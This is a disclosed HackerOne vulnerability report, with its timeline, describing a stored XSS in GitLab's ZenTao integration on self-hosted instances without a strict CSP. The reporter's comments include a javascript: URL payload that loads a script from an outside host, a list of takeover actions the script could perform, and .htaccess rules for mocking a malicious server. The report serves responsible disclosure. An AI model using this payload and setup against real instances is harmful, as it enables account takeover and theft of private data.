---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
date: 2022-09-22
submitted: 2022-04-16T10:00:28.285Z
bounty_usd: null
votes: 81
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "joaxcar"
source: "https://hackerone.com/reports/1542510"
title: "XSS in ZenTao integration affecting self hosted instances without strict CSP"
---
# XSS in ZenTao integration affecting self hosted instances without strict CSP

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 81 | **Program:** GitLab | **Disclosed:** 2022-09-22

- Report: [https://hackerone.com/reports/1542510](https://hackerone.com/reports/1542510)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2022-04-16T10:00:28.285Z

## Timeline

- **Report Filed**
- **2022-04-16** @h1_analyst_alexander: Hi @joaxcar,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@the_time_traveller
- **Report Title Updated**
- **Report Pending Program Review**
- **2022-04-19** @joaxcar: Thanks for looking into the report @the_time_traveller ,

just wanted to add some info about `javascript url` XSS. I have modified my hosted POC on https://joaxcar.com to use this payload
```
"url": "javascript:document.write('<script src=https://joaxcar.com/hack.js></script>')",
```
As you can see this payload loads another script into the DOM. This script contains the line
```
alert(document.domain)
```

What this proves is that the attack can load an arbitrary amount of JS code. So if the CSP is not strict enough (as per default, and also on a lot of publicly accessible instances) the attack can perform all actions as the victim user short of changing password. Including

* generating personal access tokens
* adding SSH keys
* access and extract all private repos and data
* add OAuth applications

and so forth. If the victim is an administrator, the attacker can also generate new admin accounts or promote the attacker to admin.

But again, there exists no CSP bypass here for gitlab.com.

Best regards
Johan
- **Report Needs More Info**
- **Report New**
- **2022-04-26** @joaxcar: And just to prove that "mocking a server" is not rocket science, all I did was adding these two lines to my webhosts `.htaccess` file
```
RewriteCond %{REQUEST_URI} ^/api.php/v1/issues
RewriteRule .* /zentao/issue.json [L]
```

And then I hosted the JSON response with the payloads in the file `/zentao/issue.json`. This will make all links of the form

`https://gitlab.example.com/user1/project1/-/integrations/zentao/issues/whatever-1`

link to the infected page
- **Report Triaged**
- **2022-05-12** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-06-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2022-06-01** @joaxcar: Hi @ngeorge saw that a patch for this was [released](https://about.gitlab.com/releases/2022/06/01/critical-security-release-gitlab-15-0-1-released/#stored-xss-in-jira-integration). Great! I wondered on the CVSS in the blog post where this one got a `attack complexity` of `high` whereas the "contacts XSS` was rated as `attack complexity` of `low`. What is it that makes the difference here? Both of them requires the victim to visit a certain page and then make one additional action. Im my case clicking on a "phishy image" or link and in the other case have the victim try to add a contact in markdown. To me the complexity here is quite similar.

Trying to learn the score rules :)

Any answer here would be very helpful, other than that god job on the fix!

/Johan
- **2022-06-03** @joaxcar: Hi again, too bad one can not remove wrongfully posted comments :)

Just realized that it was not this issue that got fixed, but my other one. Please ignore my previous discussion on this. I will sit tight from here on

Sorry for the noise
Johan
- **Bounty Awarded**
- **2022-06-23** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **2022-07-01** @ngeorge: Issue is assigned CVE-2022-2235
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
